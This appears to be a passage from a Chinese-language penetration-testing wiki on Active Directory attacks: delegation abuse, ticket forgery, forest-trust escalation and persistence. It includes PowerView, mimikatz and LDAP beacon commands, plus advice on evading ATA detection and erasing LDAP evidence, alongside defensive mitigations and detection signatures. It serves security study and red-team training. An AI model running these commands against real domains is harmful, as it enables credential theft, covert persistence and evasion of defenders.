如果用户拥有 **access MSSQL instances** 的权限，就可能利用它在 MSSQL 主机上 **execute commands**（前提是以 SA 身份运行）、**steal** NetNTLM **hash**，甚至发起 **relay attack**。\
如果某个 MSSQL 实例通过数据库链接受到另一个实例的信任，那么拥有该链接数据库权限的用户可能能够 **use the trust relationship to execute queries on the other instance**。这些信任关系可以串联起来，最终可能到达配置错误的数据库，让用户能够执行命令。\
**数据库之间的链接即使跨越 forest trusts 也能生效。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署平台滥用

第三方资产清点和部署套件通常会提供通往凭据和代码执行的强大途径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果发现某个 Computer 对象具有 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性，且你拥有该计算机上的 domain 权限，就能从内存中 dump 所有登录该计算机的用户的 TGT。\
因此，如果 **Domain Admin 登录该计算机**，你就能 dump 他的 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以 **自动攻陷一台 Print Server**（希望它是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用 “Constrained Delegation”，它就能 **冒充任意用户以访问计算机上的某些服务**。\
因此，如果你 **攻陷该用户/计算机的 hash**，就能 **冒充任意用户**（甚至是 domain admins）以访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象拥有 **WRITE** 权限，即可获得以 **elevated privileges** 执行代码的能力：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 权限/ACL 滥用

被攻陷的用户可能对某些 domain 对象拥有一些 **有用的权限**，这些权限可以让你横向 **move**/**escalate** 权限。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 服务滥用

如果发现 domain 内有 **Spool service 正在监听**，就可以加以 **abuse**，以 **获取新凭据**并 **escalate privileges**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 第三方会话滥用

如果**其他用户** **access** 这台**已被攻陷**的机器，就可能从内存中 **收集凭据**，甚至在他们的进程中 **注入 beacon** 来冒充他们。\
用户通常会通过 RDP 访问系统，以下介绍如何针对第三方 RDP 会话实施几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一套管理加入 domain 的计算机上**本地 Administrator 密码**的系统，确保密码**随机生成**、唯一且经常**更改**。这些密码存储在 Active Directory 中，并通过 ACL 控制访问权限，仅授权用户可以访问。拥有足够权限访问这些密码后，就可以 pivot 到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### 证书窃取

关于 AD CS enrollment、证书映射，以及在尝试证书窃取或模板滥用之前进行枚举，请参见 [AD Certificates 概述](ad-certificates.md)。

从被攻陷的机器上**收集证书**，可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 证书模板滥用

如果配置了**易受攻击的模板**，就可以滥用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 使用高权限账户进行 Post-exploitation

### Dump Domain Credentials

获取 **Domain Admin** 甚至更高的 **Enterprise Admin** 权限后，就可以 **dump** **domain database**：_ntds.dit_。

[**点击此处了解更多关于 DCSync attack 的信息**](dcsync.md)。

[**点击此处了解更多关于如何窃取 NTDS.dit 的信息**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

在提取之前，也应将包含 `ntds.dit` 和 `SYSTEM` hive 的可读备份档案视为已暴露的目录数据。过期的密码 hash 并不意味着其他对象属性也安全：`description` 等字段可能包含凭据或操作备注。先检查档案成员名称，并避免将提取的数据库内容输出到常规枚举结果中。

### 将 Privesc 用作 Persistence

前面讨论的一些技术也可以用于 persistence。\
例如，你可以：

- 让用户容易受到 [**Kerberoast**](kerberoast.md) 攻击。

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- 使用户容易受到 [**ASREPRoast**](asreproast.md) 攻击

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- 向用户授予 [**DCSync**](#dcsync) 权限

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** 会利用 **NTLM hash**（例如 **计算机账户的 hash**），为特定服务创建一张**合法的 Ticket Granting Service (TGS) 票据**。此方法用于**访问该服务的权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 是指攻击者获取 Active Directory (AD) 环境中 **krbtgt 账户的 NTLM hash**。该账户很特殊，因为它用于签署所有 **Ticket Granting Ticket (TGT)**，而 TGT 对在 AD 网络中进行身份验证至关重要。

获取此 hash 后，攻击者便能为任意指定账户创建 **TGT**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票据与 Golden Ticket 类似，但其伪造方式可以**绕过常见的 Golden Ticket 检测机制**。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有账户的证书或能够申请证书**，是持久访问用户账户的一种非常有效的方法（即使用户更改密码也不受影响）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限维持持久访问：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过对这些组应用标准的 **Access Control List (ACL)**，确保 **特权组**（例如 Domain Admins 和 Enterprise Admins）的安全，防止未经授权的更改。不过，这项功能也可能被滥用：如果攻击者修改 AdminSDHolder 的 ACL，向普通用户授予完全访问权限，该用户便能广泛控制所有特权组。因此，这项旨在保护安全的机制也可能适得其反；若不密切监控，就可能导致未经授权的访问。

[**此处了解有关 AdminDSHolder Group 的更多信息。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

每台 **Domain Controller (DC)** 上都存在一个**本地管理员**账户。获得此类计算机的管理员权限后，可以使用 **mimikatz** 提取本地 Administrator hash。之后需要修改注册表，以**启用此密码**，从而远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以为某个**用户**授予对特定域对象的**特殊权限**，使其能够在未来**提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptor** 用于**存储**一个**对象**对另一个**对象**拥有的**权限**。只需对某个对象的 **security descriptor** 做出**少量更改**，就可能获得对该对象非常有用的权限，而无需加入特权组。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` 辅助类，创建具有较短存活时间的主体/GPO/DNS 记录，并使用 `entryTTL`/`msDS-Entry-Time-To-Die`；这些对象会自行删除且不留下墓碑，从而擦除 LDAP 证据，但可能留下孤立的 SID、失效的 `gPLink` 引用或缓存的 DNS 响应（例如污染 AdminSDHolder ACE，或恶意修改 `gPCFileSysPath`/AD 集成 DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS**，设置一个**通用密码**，从而访问所有域账户。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[在此了解什么是 SSP (Security Support Provider)。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建**自己的 SSP**，以**明文**捕获用于访问计算机的**凭据**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个**新的 Domain Controller**，并利用它向指定对象**推送属性**（SIDHistory、SPN 等），且不会留下任何有关**修改**的**日志**。你**需要 DA** 权限，并且必须位于**根域**中。\
请注意，如果使用了错误的数据，就会产生非常明显的日志。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论过，当你拥有**读取 LAPS 密码的足够权限**时，如何提升权限。不过，这些密码也可以用于**维持持久访问**。\
参见：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**攻陷单个域可能导致整个 Forest 被攻陷**。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许一个**域**中的用户访问另一个**域**中的资源。它本质上在两个域的身份验证系统之间建立关联，使身份验证验证能够顺利进行。域建立信任关系时，会在各自的 **Domain Controller (DC)** 中交换并保存特定的 **key**，这些 key 对维护信任关系的完整性至关重要。

在典型场景中，如果用户要访问**受信任域**中的服务，必须先向自己域的 DC 请求一种称为 **inter-realm TGT** 的特殊票据。此 TGT 使用两个域共同约定的共享 **key** 加密。然后，用户将此 TGT 提交给**受信任域的 DC**，以获取服务票据（**TGS**）。受信任域的 DC 成功验证 inter-realm TGT 后，会签发 TGS，授予用户访问该服务的权限。

**步骤**：

1. **Domain 1** 中的**客户端计算机**使用其 **NTLM hash** 向 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**，以启动流程。
2. 如果客户端身份验证成功，DC1 就会签发新的 TGT。
3. 随后，客户端向 DC1 请求 **inter-realm TGT**，以便访问 **Domain 2** 中的资源。
4. 作为双向域信任的一部分，inter-realm TGT 使用 DC1 与 DC2 共享的 **trust key** 加密。
5. 客户端将 inter-realm TGT 提交给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用共享的 trust key 验证 inter-realm TGT；如果有效，就会为客户端要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将此 TGS 提交给服务器。TGS 使用服务器账户的 hash 加密，服务器据此授予客户端访问 Domain 2 中服务的权限。

### Different trusts

需要注意，**信任关系可以是单向或双向的**。在双向信任中，两个域互相信任；在**单向**信任关系中，一个域是**受信任域**，另一个是**信任域**。在后一种情况下，**你只能从受信任域访问信任域中的资源**。

如果 Domain A 信任 Domain B，那么 A 是信任域，B 是受信任域。此外，在 **Domain A** 中，这属于 **Outbound trust**；在 **Domain B** 中，则属于 **Inbound trust**。

**不同的信任关系**

- **Parent-Child Trusts**：这是同一 Forest 中的常见配置，子域会自动与其父域建立双向可传递信任。也就是说，身份验证请求可以在父域与子域之间顺利传递。
- **Cross-link Trusts**：也称为“shortcut trusts”，用于在子域之间建立信任，以加快引用流程。在复杂的 Forest 中，身份验证引用通常需要先向上到达 Forest 根域，再向下传递到目标域。建立 cross-link 可以缩短这一流程，在地理位置分散的环境中尤其有用。
- **External Trusts**：这类信任在彼此无关的不同域之间建立，且本质上不可传递。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，当需要访问当前 Forest 之外、且未通过 Forest trust 连接的域中的资源时，External trust 很有用。External trust 通过 SID filtering 增强安全性。
- **Tree-root Trusts**：这类信任会在 Forest 根域与新添加的树根之间自动建立。虽然不常见，但 Tree-root trust 对向 Forest 添加新的域树很重要，可使其保留独特的域名，并确保双向可传递性。更多信息请参阅 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这是两个 Forest 根域之间的双向可传递信任，同时会启用 SID filtering 以增强安全性。
- **MIT Trusts**：这类信任与非 Windows 的 [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos 域建立。MIT trust 更为专用，适用于需要与 Windows 生态系统之外的 Kerberos 系统集成的环境。

#### Other differences in **trusting relationships**

- 信任关系也可以是**可传递的**（A 信任 B，B 信任 C，则 A 信任 C），也可以是**不可传递的**。
- 信任关系可以设置为**双向信任**（双方互相信任）或**单向信任**（只有一方信任另一方）。

### Attack Path

1. **枚举**信任关系
2. 检查是否有任何**安全主体**（用户/组/计算机）能够**访问**另一个域的资源，例如通过 ACE 条目，或因为其属于另一个域中的组。寻找**跨域关系**（这很可能就是建立信任的原因）。
   1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **攻陷**能够在域之间**横向移动**的**账户**。

攻击者可以通过以下三种主要机制访问另一个域中的资源：

- **Local Group Membership**：主体可能被添加到计算机上的本地组中，例如服务器上的“Administrators”组，从而获得对该计算机的重要控制权。
- **Foreign Domain Group Membership**：主体也可以成为外部域中某个组的成员。不过，这种方法是否有效取决于信任的类型和组的作用范围。
- **Access Control Lists (ACLs)**：主体可能被列入 **ACL**，特别是作为 **DACL** 中 **ACE** 的对象，从而获得对特定资源的访问权限。若想深入了解 ACL、DACL 和 ACE 的运作机制，白皮书“[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”是非常有价值的资料。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**，以查找域中的外部安全主体。这些主体是来自**外部域/Forest** 的用户/组。

你可以在 **Bloodhound** 中检查，或使用 powerview：

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

枚举域信任的其他方法：

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> 有 **2 个受信任密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以用它们查看当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

利用 SID-History injection 攻击信任关系，从子域/父域提升为 Enterprise admin：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 利用可写的 Configuration NC

了解如何利用 Configuration Naming Context (NC) 至关重要。在 Active Directory (AD) 环境中，Configuration NC 是整个林的配置数据中央存储库。这些数据会复制到林中的每个 Domain Controller (DC)，其中可写 DC 会维护 Configuration NC 的可写副本。要利用这一点，必须在 DC 上拥有 **SYSTEM 权限**，最好是在子域 DC 上。

**将 GPO 链接到根 DC 站点**

Configuration NC 的 Sites 容器包含 AD 林中所有已加入域的计算机的站点信息。攻击者在任意 DC 上以 SYSTEM 权限运行时，可以将 GPO 链接到根 DC 站点。此操作可能通过操纵应用于这些站点的策略来危害根域。

如需深入了解，可参阅关于 [绕过 SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) 的研究。<sup>[[12]](#references)</sup>

**危害林中的任意 gMSA**

一种攻击途径是针对域中的特权 gMSA。计算 gMSA 密码所需的 KDS Root key 存储在 Configuration NC 中。在任意 DC 上拥有 SYSTEM 权限后，就可以访问 KDS Root key，并计算整个林中任意 gMSA 的密码。

详细分析和分步指导见：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的委派 MSA 攻击（BadSuccessor – 滥用迁移属性）：

 
{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

其他外部研究：[Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema 更改攻击**

此方法需要耐心等待新的特权 AD 对象创建。拥有 SYSTEM 权限后，攻击者可以修改 AD Schema，授予任意用户对所有类的完全控制权。这可能导致未经授权地访问和控制新创建的 AD 对象。

更多内容请参阅 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)。<sup>[[14]](#references)</sup>

**通过 ADCS ESC5 从 DA 提升为 EA**

ADCS ESC5 漏洞针对对 Public Key Infrastructure (PKI) 对象的控制权，可用于创建证书模板，从而以林中任意用户的身份进行身份验证。由于 PKI 对象位于 Configuration NC 中，攻陷可写的子域 DC 后即可执行 ESC5 攻击。

更多详情请参阅 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)。<sup>[[15]](#references)</sup> 在没有 ADCS 的情况下，攻击者也能搭建所需组件，具体讨论见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。<sup>[[16]](#references)</sup>

### 外部林域 - 单向（入站）或双向

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

在此场景中，**外部域信任你的域**，并赋予你对该域**未确定的权限**。你需要找出**你所在域的哪些主体对外部域拥有哪些访问权限**，然后尝试利用这些权限：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

在此场景中，**你的域**会将某些**权限**授予来自**其他域**的主体。

然而，当某个**域受到信任域的信任**时，受信任域会**创建一个用户**，其**用户名可预测**，并且**密码使用信任密码**。这意味着，攻击者可以**访问信任域中的用户账户，进而进入受信任域**，对其进行枚举并尝试进一步提升权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种攻陷受信任域的方法，是在与域信任**方向相反**的方向上寻找已创建的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况并不常见）。

另一种攻陷受信任域的方法，是在一台**受信任域用户可以访问**的机器上等待其通过 **RDP** 登录。然后，攻击者可以向 RDP 会话进程中注入代码，并从那里**访问受害者的源域**。\
此外，如果**受害者挂载了自己的硬盘**，攻击者可以通过 **RDP 会话**进程，将**后门**放入该硬盘的**启动文件夹**。这种技术称为 **RDPInception。**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解措施

### **SID Filtering：**

- 利用 SID history 属性跨林信任发起的攻击，可通过 SID Filtering 缓解。所有林间信任默认都会启用此功能。其依据是微软的立场：林内信任是安全的，安全边界应视为林而非域。
- 但有一个问题：SID filtering 可能会破坏应用程序和用户访问，因此有时会被停用。

### **Selective Authentication：**

- 对于林间信任，启用 Selective Authentication 可确保两个林中的用户不会自动通过身份验证。相反，用户必须获得明确授权，才能访问信任域或林中的域和服务器。
- 请注意，这些措施无法防范对可写 Configuration Naming Context (NC) 的利用，也无法防范针对信任账户的攻击。

[**关于域信任的更多信息，参见 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## 基于 LDAP 的 AD 主机内植入体滥用

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP 原语重新实现为 x64 Beacon Object Files，可在主机内植入体（例如 Adaptix C2）中完全运行。操作人员使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该套件，加载 `ldap.axs`，然后从 beacon 调用 `ldap <subcommand>`。所有流量都通过当前登录的安全上下文，经由带签名/密封的 LDAP (389) 或自动信任证书的 LDAPS (636) 传输，因此无需 socks 代理或磁盘痕迹。<sup>[[4]](#references)</sup>

### 植入体端 LDAP 枚举

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 会将短名称/OU 路径解析为完整 DN，并转储相应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 会从 `rootDSE` 获取任意属性（包括安全描述符）以及林/域元数据。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 可直接从 LDAP 中提取适合 roasting 的目标、委派设置，以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` 和 `get-writable --detailed` 会解析 DACL，列出受托主体、权限（GenericAll/WriteDACL/WriteOwner/属性写入）和继承关系，从而立即找到 ACL 权限提升目标。

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### 用于提权与持久化的 LDAP 写入原语

- 对象创建 BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）可让操作员在拥有 OU 权限的任意位置创建新的主体或机器账户。找到写属性权限后，`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 可直接劫持目标。
- 面向 ACL 的命令（如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`）可将对任意 AD 对象的 WriteDACL/WriteOwner 权限转化为重置密码、控制组成员资格或 DCSync 复制权限，且不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACE。

### 委派、Roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 可立即让被攻陷的用户变为 Kerberoastable；`add-asreproastable`（UAC 开关）可将其标记为可进行 AS-REP roasting，而无需更改密码。
- 委派宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用约束/非约束/RBCD 攻击路径，并省去远程 PowerShell 或 RSAT。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 可将特权 SID 注入受控主体的 SID 历史记录（参见 [SID-History 注入](sid-history-injection.md)），通过 LDAP/LDAPS 实现隐蔽的访问继承。
- `move-object` 可更改计算机或用户的 DN/OU，让攻击者先将资产移入委派权限范围，再使用 `set-password`、`add-groupmember` 或 `add-spn`。有关移动权限和继承检查，请参见 [OU 迁移与继承权限](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions)。
- 范围严格的删除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）可让操作员在获取凭据或建立持久化后迅速回滚，尽量减少遥测痕迹。

### AD -> Azure 与 Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**在此了解如何保护凭据。**](../stealing-credentials/credentials-protections.md)

### **凭据保护防御措施**

- **Domain Admins 限制**：建议仅允许 Domain Admins 登录 Domain Controller，避免在其他主机上使用其账户。
- **服务账户权限**：服务不应以 Domain Admin (DA) 权限运行，以维护安全。
- **临时权限限制**：需要 DA 权限的任务应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解措施**：审计事件 ID 2889/3074/3075，然后在 DC/客户端上强制启用 LDAP signing 和 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 活动的协议级指纹识别

如果要检测常见的 AD 操作手法，**不要只依赖操作员可控的痕迹**，例如改名后的二进制文件、服务名称、临时批处理文件或输出路径。建立合法 Windows 客户端生成 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI 流量的基线，然后查找即使操作员修改了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 后仍然存在的**实现特征**。<sup>[[8]](#references)</sup>

- **高置信度的独立检测候选特征**（需先根据自身基线验证）：
  - 认证后的 DCE/RPC 使用 `auth_context_id = 79231 + ctx_id`
  - DCE/RPC 认证填充内容为 `0xff`
  - LDAP Kerberos bind 将原始 Kerberos `AP-REQ` 直接放入 SPNEGO `mechToken`
  - SMB2/3 negotiate 请求中的 `ClientGuid` 值看起来像 ASCII 字符
  - WMI `IWbemLevel1Login::NTLMLogin` 使用非标准命名空间 `//./root/cimv2`
  - 硬编码的 Kerberos nonce 值
- **更适合作为关联/评分特征**：
  - 稀疏或重复的 Kerberos etype 列表、异常/缺失的 `PA-DATA`，或与原生 Windows 不同的 TGS-REQ etype 顺序
  - 缺少版本信息的 NTLM Type 1 消息，或主机名为空的 Type 3 消息
  - 在 DCE/RPC 中携带原始 NTLMSSP 而非 SPNEGO、缺少 DCE/RPC verification trailer，或 SPNEGO/Kerberos OID 不匹配
  - 同一主机/用户/会话/时间窗口中出现多种此类特征，远比任何单一弱特征更有力
- **用于补充信息，不要单独作为告警依据**：
  - 默认文件名、输出路径、随机服务名称、临时批处理名称、默认计算机账户名称，以及工具特定的 HTTP/WebDAV/RDP/MSSQL 字符串
  - 操作员很容易修改这些特征；它们最适合用于说明为何跨协议事件集群可疑
- **操作说明**：
  - 某些信号需要解密流量、[PCAP/Zeek 解析](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或服务端可见性
  - 将其纳入告警前，先针对 Samba/Linux 客户端、设备和旧版软件进行验证
  - 随着对基线的信心增加，将检测从补充信息逐步提升为主动搜寻，再提升为告警

### **实施欺骗技术**

- 实施欺骗技术包括设置诱饵，例如密码永不过期或标记为 Trusted for Delegation 的诱饵用户或计算机。详细方法包括创建具有特定权限的用户，或将其加入高权限组。<sup>[[2]](#references)</sup>
- 一个实际示例是使用如下工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 更多关于部署欺骗技术的信息，请参阅 [GitHub 上的 Deploy-Deception](https://github.com/samratashok/Deploy-Deception)。

### **识别欺骗**

- **用户对象**：可疑迹象包括异常的 ObjectSID、较少的登录次数、创建日期以及较低的错误密码计数。
- **一般迹象**：将潜在诱饵对象的属性与真实对象进行比较，可发现不一致之处。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 等工具可帮助识别此类欺骗。

### **绕过检测系统**

- **绕过 Microsoft ATA 检测**：
  - **用户枚举**：避免在 Domain Controller 上枚举会话，以防触发 ATA 检测。
  - **票据冒充**：使用 **aes** 密钥创建票据有助于规避检测，因为无需降级到 NTLM。
  - **DCSync 攻击**：建议从非 Domain Controller 执行，以避免 ATA 检测；直接从 Domain Controller 执行会触发告警。

## References

- [1] [攻击域信任指南](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [在 Active Directory 中伪造信任以实施欺骗](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [从 Domain Admin 到 Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF 集合——用于 Active Directory 漏洞利用的内存 LDAP 工具包](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck！将 NTLM 哈希用作字典](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – 剖析 Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon：通过 Netlogon 接管 Active Directory 账户](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - 如何管理与 CVE-2020-1472 相关的 Netlogon 安全通道连接变更](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [探索被遗忘的 Null Session 和 MS-RPC 接口](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter 是域之间的安全边界吗？（第 4 部分）——绕过 SID filtering 研究](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter 是域之间的安全边界吗？（第 5 部分）——Golden GMSA 信任攻击：从子域到父域](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter 是域之间的安全边界吗？（第 6 部分）——架构更改信任攻击：从子域到父域](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [利用 ESC5 从 DA 提权到 EA](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [滥用 AD CS，在 5 分钟内从子域管理员提权到企业管理员：后续篇](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
